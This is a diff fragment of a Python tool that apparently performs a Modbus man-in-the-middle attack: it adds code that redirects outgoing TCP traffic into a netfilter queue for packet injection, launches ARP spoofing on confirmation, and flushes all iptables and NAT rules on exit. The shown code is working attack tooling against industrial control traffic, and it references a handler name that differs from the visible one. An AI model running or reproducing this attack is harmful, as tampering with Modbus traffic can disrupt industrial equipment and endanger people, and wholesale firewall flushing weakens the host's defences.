@@ -112,3 +112,28 @@ def process_packet(packet):
     except Exception as e:
         console.log(f"Error: {e}")
         packet.accept()
+
+def data_injection():
+    QUEUE_NUM = 0
+    os.system("iptables -I OUTPUT -p tcp -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    queue = NetfilterQueue()
+    try:
+        queue.bind(QUEUE_NUM, process_pkt)
+        queue.run()
+    except KeyboardInterrupt:
+        os.system("iptables --flush && iptables -t nat -F")
+        print("........Exiting......")
+        sleep(3)
+    finally: 
+        queue.unbind()
+
+if __name__ == '__main__':
+    get_ip()
+    if( Prompt.ask("START MODBUS_MITM? [y/n]", default='unknown') == 'y'):
+        arp_spoofing()
+        data_injection()
+    else:
+        console.log("Exiting ...")
+        sleep(3)
+        exit(0)
+        
